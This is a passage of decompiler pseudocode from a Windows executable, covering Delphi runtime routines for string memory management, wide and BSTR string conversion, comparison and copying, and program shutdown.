  if ( dword_42B004 )
  {
    sub_404064((int)this);
    sub_4040F0(v2);
    dword_42B004 = 0;
  }
  while ( 1 )
  {
    if ( *((_BYTE *)&dword_42C62C + 40) == 2 && !dword_42B000 )
      *(&dword_42C62C + 3) = 0;
    sub_403F18();
    if ( *((_BYTE *)&dword_42C62C + 40) <= 1u || dword_42B000 )
    {
      v3 = *(&dword_42C62C + 4);
      if ( v3 )
      {
        sub_405ED0(v3);
        v4 = (int)*(&dword_42C62C + 4);
        v5 = *(_DWORD *)(v4 + 16);
        if ( v5 != *(_DWORD *)(v4 + 4) )
        {
          if ( v5 )
            FreeLibrary(*(HMODULE *)(v4 + 16));
        }
      }
    }
    sub_403EF0();
    if ( *((_BYTE *)&dword_42C62C + 40) == 1 )
      ((void (*)(void))*(&dword_42C62C + 9))();
    if ( *((_BYTE *)&dword_42C62C + 40) )
      sub_4040C0(v6, v7, (int)v8);
    if ( !dword_42C62C )
    {
      if ( dword_42C024 )
        dword_42C024();
      ExitProcess(dword_42B000);
    }
    v8 = &dword_42B000;
    qmemcpy(&dword_42C62C, dword_42C62C, 0x2Cu);
  }
}
// 4041B4: variable 'this' is possibly undefined
// 4041B9: variable 'v2' is possibly undefined
// 40421A: variable 'v6' is possibly undefined
// 40421A: variable 'v7' is possibly undefined
// 40421A: variable 'v8' is possibly undefined
// 42B000: using guessed type int dword_42B000;
// 42B004: using guessed type int dword_42B004;
// 42C024: using guessed type int (*dword_42C024)(void);
// 42C62C: using guessed type const void *dword_42C62C;

//----- (00404254) --------------------------------------------------------
void __usercall __noreturn sub_404254(int a1@<eax>, void *a2@<ecx>)
{
  dword_42B000 = a1;
  sub_40417C(a2);
}
// 42B000: using guessed type int dword_42B000;

//----- (00404260) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __noreturn sub_404260()
{
  int v0; // [esp-4h] [ebp-4h]

  dword_42B004 = v0;
  sub_404254();
}
// 404266: positive sp value 4 has been found
// 404260: variable 'v0' is possibly undefined
// 404254: using guessed type void __noreturn sub_404254();
// 404260: using guessed type void __noreturn sub_404260();
// 42B004: using guessed type int dword_42B004;

//----- (0040426C) --------------------------------------------------------
_DWORD *__usercall sub_40426C@<eax>(_DWORD *result@<eax>)
{
  int v1; // edx
  _DWORD *v2; // [esp-4h] [ebp-4h]

  v1 = *result;
  if ( *result )
  {
    *result = 0;
    if ( *(int *)(v1 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v1 - 8)) )
    {
      v2 = result;
      sub_402700(v1 - 8);
      return v2;
    }
  }
  return result;
}

//----- (00404290) --------------------------------------------------------
int __usercall sub_404290@<eax>(int result@<eax>, int a2@<edx>)
{
  int *v2; // ebx
  int v4; // edx

  v2 = (int *)result;
  do
  {
    v4 = *v2;
    if ( *v2 )
    {
      *v2 = 0;
      if ( *(int *)(v4 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v4 - 8)) )
        result = sub_402700(v4 - 8);
    }
    ++v2;
    --a2;
  }
  while ( a2 );
  return result;
}

//----- (004042C0) --------------------------------------------------------
volatile __int32 *__usercall sub_4042C0@<eax>(volatile __int32 *result@<eax>, __int32 a2@<edx>)
{
  char *v2; // edx
  char *v3; // eax
  __int32 v4; // edx
  char *v5; // [esp-8h] [ebp-8h]
  char *v6; // [esp-8h] [ebp-8h]
  volatile __int32 *v7; // [esp-4h] [ebp-4h]

  if ( a2 )
  {
    if ( (*(_DWORD *)(a2 - 8) + 1 < 0) ^ __OFADD__(1, *(_DWORD *)(a2 - 8)) | (*(_DWORD *)(a2 - 8) == -1) )
    {
      v7 = result;
      v5 = (char *)a2;
      v2 = (char *)sub_404330(*(_DWORD *)(a2 - 4));
      v3 = v5;
      v6 = v2;
      sub_402844(v3, v2, *((_DWORD *)v3 - 1));
      a2 = (__int32)v6;
      result = v7;
    }
    else
    {
      _InterlockedIncrement((volatile signed __int32 *)(a2 - 8));
    }
  }
  v4 = _InterlockedExchange(result, a2);
  if ( v4 && *(int *)(v4 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v4 - 8)) )
    return (volatile __int32 *)sub_402700(v4 - 8);
  return result;
}

//----- (00404304) --------------------------------------------------------
volatile __int32 *__usercall sub_404304@<eax>(volatile __int32 *result@<eax>, __int32 a2@<edx>)
{
  __int32 v2; // edx

  if ( a2 && !((*(_DWORD *)(a2 - 8) + 1 < 0) ^ __OFADD__(1, *(_DWORD *)(a2 - 8)) | (*(_DWORD *)(a2 - 8) == -1)) )
    _InterlockedIncrement((volatile signed __int32 *)(a2 - 8));
  v2 = _InterlockedExchange(result, a2);
  if ( v2 && *(int *)(v2 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v2 - 8)) )
    return (volatile __int32 *)sub_402700(v2 - 8);
  return result;
}

//----- (00404330) --------------------------------------------------------
int __usercall sub_404330@<eax>(int a1@<eax>)
{
  int v1; // eax
  int result; // eax
  int v3; // [esp-8h] [ebp-8h]

  if ( a1 <= 0 )
    return 0;
  v3 = (a1 + 10) & 0xFFFFFFFE;
  v1 = sub_4026E0(v3);
  *(_WORD *)(v3 + v1 - 2) = 0;
  result = v1 + 8;
  *(_DWORD *)(result - 4) = a1;
  *(_DWORD *)(result - 8) = 1;
  return result;
}

//----- (0040435C) --------------------------------------------------------
_DWORD *__usercall sub_40435C@<eax>(char **a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  char *v6; // eax
  int v7; // ecx
  char *v8; // edi
  _DWORD *result; // eax

  v6 = (char *)sub_404330(a3);
  v7 = a3;
  v8 = v6;
  if ( a2 )
    sub_402844(a2, v6, v7);
  result = sub_40426C(a1);
  *a1 = v8;
  return result;
}

//----- (0040438C) --------------------------------------------------------
int __userpurge sub_40438C@<eax>(LPCWCH lpWideCharStr@<ecx>, int cbMultiByte@<edx>, CHAR *a3@<eax>, int cchWideChar)
{
  return WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, a3, cbMultiByte, 0, 0);
}

//----- (004043A8) --------------------------------------------------------
int __userpurge sub_4043A8@<eax>(LPCCH lpMultiByteStr@<ecx>, int cchWideChar@<edx>, WCHAR *a3@<eax>, int cbMultiByte)
{
  return MultiByteToWideChar(0, 0, lpMultiByteStr, cbMultiByte, a3, cchWideChar);
}

//----- (004043C0) --------------------------------------------------------
_DWORD *__usercall sub_4043C0@<eax>(int cchWideChar@<ecx>, char **a2@<eax>, const WCHAR *a3@<edx>)
{
  int v6; // ebp
  int v7; // ebx
  int v8; // ebx
  _DWORD v10[1028]; // [esp+4h] [ebp-1010h] BYREF

  v10[0] = a2;
  if ( cchWideChar <= 0 )
    return sub_40426C(a2);
  v6 = cchWideChar + 1;
  if ( cchWideChar + 1 < 2047 )
  {
    v7 = sub_40438C(a3, 4095, (CHAR *)v10, cchWideChar);
    if ( v7 >= 0 )
      return sub_40435C(a2, (char *)v10, v7);
  }
  sub_40484C(a2, 2 * v6);
  v8 = sub_40438C(a3, 2 * v6, *a2, cchWideChar);
  if ( v8 < 0 )
    v8 = 0;
  return sub_40484C(a2, v8);
}

//----- (0040444C) --------------------------------------------------------
_DWORD *__usercall sub_40444C@<eax>(char **a1@<eax>)
{
  char v2; // [esp-4h] [ebp-4h] BYREF

  return sub_40435C(a1, &v2, 1);
}

//----- (0040445C) --------------------------------------------------------
_DWORD *__usercall sub_40445C@<eax>(char **a1@<eax>, char *a2@<edx>)
{
  int v2; // ecx
  char *v3; // ecx
  char *v5; // [esp-4h] [ebp-4h]

  v2 = 0;
  if ( a2 )
  {
    v5 = a2;
    while ( *a2 )
    {
      if ( !a2[1] )
        goto LABEL_10;
      if ( !a2[2] )
        goto LABEL_9;
      if ( !a2[3] )
      {
        ++a2;
LABEL_9:
        ++a2;
LABEL_10:
        ++a2;
        break;
      }
      a2 += 4;
    }
    v3 = a2;
    a2 = v5;
    v2 = v3 - v5;
  }
  return sub_40435C(a1, a2, v2);
}

//----- (0040448C) --------------------------------------------------------
_DWORD *__usercall sub_40448C@<eax>(char **a1@<eax>, int a2@<edx>)
{
  int v2; // ecx
  int v3; // ecx
  int v5; // [esp-4h] [ebp-4h]

  v2 = 0;
  if ( a2 )
  {
    v5 = a2;
    while ( *(_WORD *)a2 )
    {
      if ( !*(_WORD *)(a2 + 2) )
        goto LABEL_10;
      if ( !*(_WORD *)(a2 + 4) )
        goto LABEL_9;
      if ( !*(_WORD *)(a2 + 6) )
      {
        a2 += 2;
LABEL_9:
        a2 += 2;
LABEL_10:
        a2 += 2;
        break;
      }
      a2 += 8;
    }
    v3 = a2;
    a2 = v5;
    v2 = (unsigned int)(v3 - v5) >> 1;
  }
  return sub_4043C0(v2, a1, (const WCHAR *)a2);
}

//----- (004044C8) --------------------------------------------------------
_DWORD *__usercall sub_4044C8@<eax>(char **a1@<eax>, char *a2@<edx>)
{
  return sub_40435C(a1, a2 + 1, (unsigned __int8)*a2);
}

//----- (004044D4) --------------------------------------------------------
_DWORD *__usercall sub_4044D4@<eax>(char **a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  char *v3; // edi
  bool v4; // zf
  int v6; // [esp-8h] [ebp-Ch]

  v6 = a3;
  v3 = a2;
  v4 = 1;
  do
  {
    if ( !a3 )
      break;
    v4 = *v3++ == 0;
    --a3;
  }
  while ( !v4 );
  if ( v4 )
    a3 = ~a3;
  return sub_40435C(a1, a2, v6 + a3);
}

//----- (004044EC) --------------------------------------------------------
_DWORD *__usercall sub_4044EC@<eax>(char **a1@<eax>, const WCHAR *a2@<edx>)
{
  int v2; // ecx

  v2 = 0;
  if ( a2 )
    v2 = *((_DWORD *)a2 - 1) >> 1;
  return sub_4043C0(v2, a1, a2);
}

//----- (00404500) --------------------------------------------------------
_BYTE *__usercall sub_404500@<eax>(_BYTE *result@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  int v3; // ebx

  if ( a2 && (v3 = *((_DWORD *)a2 - 1)) != 0 )
  {
    if ( a3 >= v3 )
      a3 = *((_DWORD *)a2 - 1);
    *result = a3;
    return (_BYTE *)sub_402844(a2, result + 1, a3);
  }
  else
  {
    *result = 0;
  }
  return result;
}

//----- (00404524) --------------------------------------------------------
int __usercall sub_404524@<eax>(int result@<eax>)
{
  if ( result )
    return *(_DWORD *)(result - 4);
  return result;
}

//----- (0040452C) --------------------------------------------------------
char **__usercall sub_40452C@<eax>(char **result@<eax>, __int32 a2@<edx>)
{
  char *v2; // ecx
  char **v3; // ebx
  int v5; // edi
  int v6; // edx
  char *v7; // eax
  int v8; // ecx

  if ( a2 )
  {
    v2 = *result;
    if ( *result )
    {
      v3 = result;
      v5 = *((_DWORD *)v2 - 1);
      v6 = v5 + *(_DWORD *)(a2 - 4);
      if ( (char *)a2 == v2 )
      {
        sub_40484C(result, v6);
        v7 = *v3;
        v8 = v5;
      }
      else
      {
        sub_40484C(result, v6);
        v7 = (char *)a2;
        v8 = *(_DWORD *)(a2 - 4);
      }
      return (char **)sub_402844(v7, &(*v3)[v5], v8);
    }
    else
    {
      return (char **)sub_4042C0((volatile __int32 *)result, a2);
    }
  }
  return result;
}

//----- (00404570) --------------------------------------------------------
volatile __int32 *__usercall sub_404570@<eax>(volatile __int32 *a1@<eax>, char *a2@<edx>, char *a3@<ecx>)
{
  char *v6; // edi

  if ( !a2 )
    return sub_4042C0(a1, (__int32)a3);
  if ( !a3 )
    return sub_4042C0(a1, (__int32)a2);
  if ( a2 == *(char **)a1 )
    return (volatile __int32 *)sub_40452C((char **)a1, (__int32)a3);
  if ( a3 == *(char **)a1 )
  {
    v6 = (char *)sub_404330(*((_DWORD *)a3 - 1) + *((_DWORD *)a2 - 1));
    sub_402844(a2, v6, *((_DWORD *)a2 - 1));
    sub_402844(a3, &v6[*((_DWORD *)a2 - 1)], *((_DWORD *)a3 - 1));
    if ( v6 )
      --*((_DWORD *)v6 - 2);
    return sub_4042C0(a1, (__int32)v6);
  }
  else
  {
    sub_4042C0(a1, (__int32)a2);
    return (volatile __int32 *)sub_40452C((char **)a1, (__int32)a3);
  }
}

//----- (004045E4) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
volatile __int32 *__usercall sub_4045E4@<eax>(volatile __int32 *a1@<eax>, int a2@<edx>)
{
  int v2; // ebx
  char **v3; // edi
  int v4; // ecx
  int v5; // eax
  char **v6; // ecx
  int v7; // esi
  char *v8; // esi
  char *v9; // eax
  char *v10; // edx
  int v11; // ecx
  volatile __int32 *result; // eax
  __int32 v13; // [esp-10h] [ebp-1Ch]
  int v15; // [esp+8h] [ebp-4h]

  v2 = a2;
  v3 = 0;
  v4 = *(&v15 + a2);
  if ( v4 && *a1 == v4 )
    v3 = (char **)a1;
  v5 = 0;
  do
  {
    v6 = (char **)*(&v15 + a2);
    if ( v6 )
    {
      v5 += (int)*(v6 - 1);
      if ( v3 == v6 )
        v3 = 0;
    }
    --a2;
  }
  while ( a2 );
  if ( v3 )
  {
    v7 = *((_DWORD *)*v3 - 1);
    sub_40484C(v3, v5);
    v13 = (__int32)v3;
    v8 = &(*v3)[v7];
    --v2;
  }
  else
  {
    v13 = sub_404330(v5);
    v8 = (char *)v13;
  }
  do
  {
    v9 = (char *)*(&v15 + v2);
    v10 = v8;
    if ( v9 )
    {
      v11 = *((_DWORD *)v9 - 1);
      v8 += v11;
      sub_402844(v9, v10, v11);
    }
    --v2;
  }
  while ( v2 );
  result = a1;
  if ( !v3 )
  {
    if ( v13 )
      --*(_DWORD *)(v13 - 8);
    return sub_4042C0(a1, v13);
  }
  return result;
}
// 40465F: positive sp value 4 has been found

//----- (00404668) --------------------------------------------------------
int __usercall Delphi_CompareCall_404668@<eax>(int result@<eax>, int *a2@<edx>)
{
  int *v2; // esi
  int *v3; // edi
  unsigned int v4; // eax
  unsigned int v5; // edx
  bool v6; // cc
  unsigned int v7; // edx
  unsigned int v8; // edx
  int v9; // ecx
  int v10; // ebx
  char v11; // [esp-4h] [ebp-10h]

  v2 = (int *)result;
  v3 = a2;
  if ( (int *)result != a2 )
  {
    if ( result )
    {
      if ( a2 )
      {
        v4 = *(_DWORD *)(result - 4);
        v5 = *(a2 - 1);
        v6 = v4 <= v5;
        result = v4 - v5;
        if ( v6 )
          v5 += result;
        v11 = v5;
        v7 = v5 >> 2;
        if ( v7 )
        {
          while ( *v2 == *v3 )
          {
            v8 = v7 - 1;
            if ( !v8 )
            {
              ++v2;
              ++v3;
              goto LABEL_13;
            }
            if ( v2[1] != v3[1] )
              return result;
            v2 += 2;
            v3 += 2;
            v7 = v8 - 1;
            if ( !v7 )
              goto LABEL_13;
          }
        }
        else
        {
LABEL_13:
          if ( (v11 & 3) == 0
            || (v9 = *v2, v10 = *v3, (unsigned __int8)*v2 == (unsigned __int8)*v3)
            && ((v11 & 3) == 1 || BYTE1(v9) == BYTE1(v10) && ((v11 & 3) == 2 || (v9 & 0xFF0000) == (v10 & 0xFF0000))) )
          {
            result *= 2;
          }
        }
      }
      else
      {
        return *(_DWORD *)(result - 4);
      }
    }
    else
    {
      return -*(a2 - 1);
    }
  }
  return result;
}

//----- (0040470C) --------------------------------------------------------
int __usercall sub_40470C@<eax>(int result@<eax>)
{
  if ( result )
  {
    if ( !((*(_DWORD *)(result - 8) + 1 < 0) ^ __OFADD__(1, *(_DWORD *)(result - 8)) | (*(_DWORD *)(result - 8) == -1)) )
      _InterlockedIncrement((volatile signed __int32 *)(result - 8));
  }
  return result;
}

//----- (0040471C) --------------------------------------------------------
char *__usercall sub_40471C@<eax>(char *result@<eax>)
{
  if ( !result )
    return &byte_404721;
  return result;
}
// 404721: using guessed type char byte_404721;

//----- (00404728) --------------------------------------------------------
char *__usercall sub_404728@<eax>(char **a1@<eax>)
{
  char *v1; // edx
  char *v3; // edx
  char *v4; // eax
  char *v6; // [esp-8h] [ebp-8h]

  v1 = *a1;
  if ( *a1 && *((_DWORD *)v1 - 2) != 1 )
  {
    v3 = (char *)sub_404330(*((_DWORD *)v1 - 1));
    v4 = *a1;
    *a1 = v3;
    v6 = v4;
    sub_402844(v4, v3, *((_DWORD *)v4 - 1));
    if ( *((int *)v6 - 2) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)v6 - 2) )
      sub_402700((int)(v6 - 8));
    return *a1;
  }
  return v1;
}

//----- (0040477C) --------------------------------------------------------
_DWORD *__userpurge Delphi_Copy_40477C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, char **a4)
{
  int v4; // ebx
  bool v5; // sf
  bool v6; // of
  int v7; // edx
  int v8; // ebx

  if ( !a1 )
    return sub_40426C(a4);
  v4 = *(_DWORD *)(a1 - 4);
  if ( !v4 )
    return sub_40426C(a4);
  v6 = __OFSUB__(a2, 1);
  v5 = a2 - 1 < 0;
  v7 = a2 - 1;
  if ( v5 != v6 )
  {
    v7 = 0;
  }
  else if ( v7 >= v4 )
  {
    return sub_40426C(a4);
  }
  v8 = v4 - v7;
  if ( a3 < 0 )
    return sub_40426C(a4);
  if ( a3 > v8 )
    a3 = v8;
  return sub_40435C(a4, (char *)(a1 + v7), a3);
}

//----- (004047BC) --------------------------------------------------------
char *__usercall sub_4047BC@<eax>(char **a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  char *result; // eax
  char *v7; // edx
  int v8; // ecx
  bool v9; // sf
  bool v10; // of
  int v11; // esi
  int v12; // ecx

  result = sub_40476C(a1);
  v7 = *a1;
  if ( *a1 )
  {
    v8 = *((_DWORD *)v7 - 1);
    v10 = __OFSUB__(a2, 1);
    v9 = a2 - 1 < 0;
    v11 = a2 - 1;
    if ( v9 == v10 && v11 < v8 && a3 > 0 )
    {
      v12 = v8 - v11;
      if ( a3 > v12 )
        a3 = v12;
      sub_402844(&v7[v11 + a3], &v7[v11], v12 - a3);
      return (char *)sub_40484C(a1, *((_DWORD *)*a1 - 1) - a3);
    }
  }
  return result;
}

//----- (00404804) --------------------------------------------------------
_BYTE *__usercall sub_404804@<eax>(_BYTE *result@<eax>, _BYTE *a2@<edx>)
{
  _BYTE *v2; // esi
  _BYTE *v3; // edi
  signed int v4; // ecx
  signed int v5; // edx
  unsigned __int8 v6; // al
  const void *v7; // esi
  bool v8; // zf
  bool v9; // cc
  int v10; // ecx
  int v11; // ebx
  _BYTE *v12; // [esp-18h] [ebp-18h]
  const void *v13; // [esp-14h] [ebp-14h]

  if ( result )
  {
    if ( a2 )
    {
      v2 = result;
      v3 = a2;
      v4 = *((_DWORD *)a2 - 1);
      v5 = *((_DWORD *)result - 1) - 1;
      if ( v5 >= 0 )
      {
        v6 = *result;
        v7 = v2 + 1;
        v8 = v4 == v5;
        v9 = v4 <= v5;
        v10 = v4 - v5;
        if ( !v9 )
        {
          while ( 1 )
          {
            do
            {
              if ( !v10 )
                break;
              v8 = *v3++ == v6;
              --v10;
            }
            while ( !v8 );
            if ( !v8 )
              break;
            v11 = v10;
            v13 = v7;
            v12 = v3;
            v8 = memcmp(v7, v3, v5) == 0;
            v3 = v12;
            v7 = v13;
            if ( v8 )
              return (_BYTE *)(v12 - a2);
            v10 = v11;
          }
        }
      }
      return 0;
    }
    else
    {
      return 0;
    }
  }
  return result;
}

//----- (0040484C) --------------------------------------------------------
_DWORD *__usercall sub_40484C@<eax>(char **a1@<eax>, int a2@<edx>)
{
  char *v4; // edi
  char *v5; // eax
  _DWORD *result; // eax
  char *v7; // eax
  int v8; // ecx
  char *v9; // [esp-4h] [ebp-10h] BYREF

  v4 = 0;
  if ( a2 > 0 )
  {
    v5 = *a1;
    if ( *a1 && *((_DWORD *)v5 - 2) == 1 )
    {
      v9 = v5 - 8;
      sub_402720(&v9, a2 + 9);
      result = v9 + 8;
      *a1 = v9 + 8;
      *(result - 1) = a2;
      *((_BYTE *)result + a2) = 0;
      return result;
    }
    v4 = (char *)sub_404330(a2);
    v7 = *a1;
    if ( *a1 )
    {
      v8 = *((_DWORD *)v7 - 1);
      if ( v8 >= a2 )
        v8 = a2;
      sub_402844(v7, v4, v8);
    }
  }
  result = sub_40426C(a1);
  *a1 = v4;
  return result;
}

//----- (004048B0) --------------------------------------------------------
int __usercall sub_4048B0@<eax>(int a1@<eax>, char *a2@<edx>, signed int a3@<ecx>)
{
  signed int v5; // ecx
  int v6; // eax
  signed int v8; // [esp-4h] [ebp-8h]

  v5 = 0;
  if ( a2 )
  {
    v5 = *((_DWORD *)a2 - 1);
    a3 -= v5;
  }
  v8 = v5;
  v6 = sub_402FCC(a1, a3);
  return sub_402F78(v6, a2, v8);
}

//----- (004048D8) --------------------------------------------------------
BSTR __usercall sub_4048D8@<eax>(BSTR result@<eax>)
{
  void *v1; // ecx

  if ( result )
  {
    result = SysAllocStringLen(0, (UINT)result);
    if ( !result )
      sub_4027E8(1, v1);
  }
  return result;
}
// 4048D2: variable 'v1' is possibly undefined

//----- (004048F0) --------------------------------------------------------
void __usercall sub_4048F0(volatile __int32 *a1@<eax>, __int32 a2@<edx>)
{
  OLECHAR *v2; // edx

  v2 = (OLECHAR *)_InterlockedExchange(a1, a2);
  if ( v2 )
    SysFreeString(v2);
}

//----- (00404900) --------------------------------------------------------
OLECHAR **__usercall sub_404900@<eax>(OLECHAR **result@<eax>)
{
  OLECHAR *v1; // edx
  OLECHAR **v2; // [esp-4h] [ebp-4h]

  v1 = *result;
  if ( *result )
  {
    *result = 0;
    v2 = result;
    SysFreeString(v1);
    return v2;
  }
  return result;
}

//----- (00404918) --------------------------------------------------------
void __usercall sub_404918(OLECHAR **a1@<eax>, int a2@<edx>)
{
  OLECHAR *v4; // eax

  do
  {
    v4 = *a1;
    if ( *a1 )
    {
      *a1 = 0;
      SysFreeString(v4);
    }
    ++a1;
    --a2;
  }
  while ( a2 );
}

//----- (0040493C) --------------------------------------------------------
OLECHAR **__usercall sub_40493C@<eax>(OLECHAR **a1@<eax>, const OLECHAR *a2@<edx>)
{
  unsigned int v2; // ecx
  OLECHAR **result; // eax
  void *v4; // ecx

  if ( !a2 )
    return sub_404900(a1);
  v2 = *((_DWORD *)a2 - 1) >> 1;
  if ( !v2 )
    return sub_404900(a1);
  result = (OLECHAR **)SysReAllocStringLen(a1, a2, v2);
  if ( !result )
    sub_4027E8(1, v4);
  return result;
}
// 4048D2: variable 'v4' is possibly undefined

//----- (00404960) --------------------------------------------------------
void __usercall sub_404960(int cbMultiByte@<ecx>, int *a2@<eax>, const CHAR *a3@<edx>)
{
  int v5; // ebp
  int v6; // ebx
  OLECHAR *v7; // ebx
  OLECHAR strIn[2056]; // [esp+4h] [ebp-1010h] BYREF

  *(_DWORD *)strIn = a2;
  if ( cbMultiByte > 0 )
  {
    v5 = cbMultiByte + 1;
    if ( cbMultiByte + 1 >= 2047 || (v6 = sub_4043A8(a3, 2047, strIn, cbMultiByte), v6 <= 0) )
    {
      sub_404BA8(a2, (OLECHAR *)(cbMultiByte + 1));
      v7 = (OLECHAR *)sub_4043A8(a3, v5, (WCHAR *)*a2, cbMultiByte);
      if ( (int)v7 < 0 )
        v7 = 0;
      sub_404BA8(a2, v7);
    }
    else
    {
      sub_4049EC(v6, strIn, (OLECHAR **)a2);
    }
  }
  else
  {
    sub_404900((OLECHAR **)a2);
  }
}

//----- (004049EC) --------------------------------------------------------
void __usercall sub_4049EC(UINT ui@<ecx>, OLECHAR *strIn@<edx>, OLECHAR **a3@<eax>)
{
  BSTR v3; // eax
  void *v4; // ecx
  OLECHAR **v5; // edx
  OLECHAR *v7; // [esp-4h] [ebp-4h]

  if ( ui )
  {
    v3 = SysAllocStringLen(strIn, ui);
    if ( !v3 )
      sub_4027E8(1, v4);
    v5 = a3;
    v7 = *a3;
    *v5 = v3;
    SysFreeString(v7);
  }
  else
  {
    sub_404900(a3);
  }
}
// 4048D2: variable 'v4' is possibly undefined

//----- (00404A10) --------------------------------------------------------
void __usercall sub_404A10(OLECHAR **a1@<eax>, OLECHAR *a2@<edx>)
{
  unsigned int v2; // ecx
  OLECHAR *v3; // ecx
  OLECHAR *v4; // [esp-4h] [ebp-4h]

  v2 = 0;
  if ( a2 )
  {
    v4 = a2;
    while ( *a2 )
    {
      if ( !a2[1] )
        goto LABEL_10;
      if ( !a2[2] )
        goto LABEL_9;
      if ( !a2[3] )
      {
        ++a2;
LABEL_9:
        ++a2;
LABEL_10:
        ++a2;
        break;
      }
      a2 += 4;
    }
    v3 = a2;
    a2 = v4;
    v2 = (unsigned int)((char *)v3 - (char *)v4) >> 1;
  }
  sub_4049EC(v2, a2, a1);
}

//----- (00404A4C) --------------------------------------------------------
void __usercall sub_404A4C(int *a1@<eax>, const CHAR *a2@<edx>)
{
  int v2; // ecx

  v2 = 0;
  if ( a2 )
    v2 = *((_DWORD *)a2 - 1);
  sub_404960(v2, a1, a2);
}

//----- (00404A5C) --------------------------------------------------------
__int16 *__usercall sub_404A5C@<eax>(__int16 *result@<eax>)
{
  if ( !result )
    return &word_404A62;
  return result;
}
// 404A62: using guessed type __int16 word_404A62;

//----- (00404A6C) --------------------------------------------------------
int __usercall sub_404A6C@<eax>(int result@<eax>)
{
  if ( result )
    return *(_DWORD *)(result - 4) >> 1;
  return result;
}

//----- (00404A78) --------------------------------------------------------
int __usercall sub_404A78@<eax>(int *a1@<eax>, char *a2@<edx>)
{
  int result; // eax
  int v4; // ebx
  int v5; // esi
  char *v6; // eax
  __int32 v7; // edi

  result = sub_404A6C((int)a2);
  v4 = result;
  if ( result )
  {
    v5 = sub_404A6C(*a1);
    v6 = (char *)sub_4048D8((BSTR)(v4 + v5));
    v7 = (__int32)v6;
    if ( v5 > 0 )
      sub_402844((char *)*a1, v6, 2 * v5);
    sub_402844(a2, (char *)(v7 + 2 * v5), 2 * v4);
    sub_4048F0(a1, v7);
  }
  return result;
}

//----- (00404AD8) --------------------------------------------------------
int __usercall sub_404AD8@<eax>(int result@<eax>, _DWORD *a2@<edx>)
{
  _DWORD *v2; // esi
  _DWORD *v3; // edi
  unsigned int v4; // eax
  unsigned int v5; // edx
  bool v6; // cc
  unsigned int v7; // edx
  unsigned int v8; // edx
  char v9; // [esp-4h] [ebp-10h]

  v2 = (_DWORD *)result;
  v3 = a2;
  if ( (_DWORD *)result != a2 )
  {
    if ( result )
    {
      if ( a2 )
      {
        v4 = *(_DWORD *)(result - 4);
        v5 = *(a2 - 1);
        v6 = v4 <= v5;
        result = v4 - v5;
        if ( v6 )
          v5 += result;
        v9 = v5;
        v7 = v5 >> 2;
        if ( v7 )
        {
          while ( *v2 == *v3 )
          {
            v8 = v7 - 1;
            if ( !v8 )
            {
              ++v2;
              ++v3;
              goto LABEL_13;
            }
            if ( v2[1] != v3[1] )
              return result;
            v2 += 2;
            v3 += 2;
            v7 = v8 - 1;
            if ( !v7 )
              goto LABEL_13;
          }
        }
        else
        {
LABEL_13:
          if ( (v9 & 2) == 0 || *(_WORD *)v2 == *(_WORD *)v3 )
            result *= 2;
        }
      }
      else
      {
        return *(_DWORD *)(result - 4);
      }
    }
    else
    {
      return -*(a2 - 1);
    }
  }
  return result;
}

//----- (00404B5C) --------------------------------------------------------
void __userpurge sub_404B5C(int a1@<eax>, int a2@<edx>, int a3@<ecx>, OLECHAR **a4)
{
  int v7; // eax
  int v8; // ebx
  signed int v9; // eax

  v7 = sub_404A6C(a1);
  if ( a2 >= 1 )
  {
    v8 = a2 - 1;
    if ( v7 < v8 )
      v8 = v7;
  }
  else
  {
    v8 = 0;
  }
  if ( a3 >= 0 )
  {
    v9 = v7 - v8;
    if ( a3 < v9 )
      v9 = a3;
  }
  else
  {
    v9 = 0;
  }
  sub_4049EC(v9, (OLECHAR *)(a1 + 2 * v8), a4);
}

//----- (00404BA8) --------------------------------------------------------
void __usercall sub_404BA8(int *a1@<eax>, OLECHAR *a2@<edx>)
{
  char *v4; // ebx
  int v5; // eax

  v4 = 0;
  if ( (int)a2 > 0 )
  {
    v4 = (char *)sub_4048D8(a2);
    v5 = sub_404A6C(*a1);
    if ( v5 > 0 )
    {
      if ( (int)a2 < v5 )
        v5 = (int)a2;
      sub_402844((char *)*a1, v4, 2 * v5);
    }
  }
  sub_4048F0(a1, (__int32)v4);
}

//----- (00404BEC) --------------------------------------------------------
char __usercall sub_404BEC@<al>(int a1@<eax>, int a2@<edx>)
{
  int v2; // ecx
  int v4; // esi
  int v5; // edi
  char result; // al
  bool v7; // zf
  bool v8; // sf
  bool v9; // of

  v2 = *(unsigned __int8 *)(a2 + 1);
  v4 = v2 + a2 + 10;
  v5 = *(_DWORD *)(v2 + a2 + 6);
  do
  {
    result = sub_404C1C((_DWORD *)(a1 + *(_DWORD *)(v4 + 4)), **(_BYTE ***)v4, 1);
    v4 += 8;
    v9 = __OFSUB__(v5, 1);
    v7 = v5 == 1;
    v8 = --v5 < 0;
  }
  while ( !(v8 ^ v9 | v7) );
  return result;
}

//----- (00404C1C) --------------------------------------------------------
char __usercall sub_404C1C@<al>(_DWORD *a1@<eax>, _BYTE *a2@<edx>, int a3@<ecx>)
{
  _DWORD *v3; // ebx
  int v5; // edi
  int v6; // edx
  int v7; // ecx
  bool v8; // cc
  int v9; // ebp
  int v10; // ebp

  if ( a3 )
  {
    v3 = a1;
    v5 = a3;
    LOBYTE(a1) = *a2;
    v6 = (unsigned __int8)a2[1];
    v7 = 0;
    switch ( (_BYTE)a1 )
    {
      case 0xA:
      case 0xB:
        do
        {
LABEL_10:
          *v3++ = 0;
          v8 = v5-- <= 1;
        }
        while ( !v8 );
        return (char)a1;
      case 0xC:
        do
        {
          *v3 = 0;
          v3[1] = 0;
          v3[2] = 0;
          v3[3] = 0;
          v3 += 4;
          v8 = v5-- <= 1;
        }
        while ( !v8 );
        break;
      case 0xD:
        v9 = v6;
        do
        {
          v3 = (_DWORD *)((char *)v3 + *(_DWORD *)&a2[v9 + 2]);
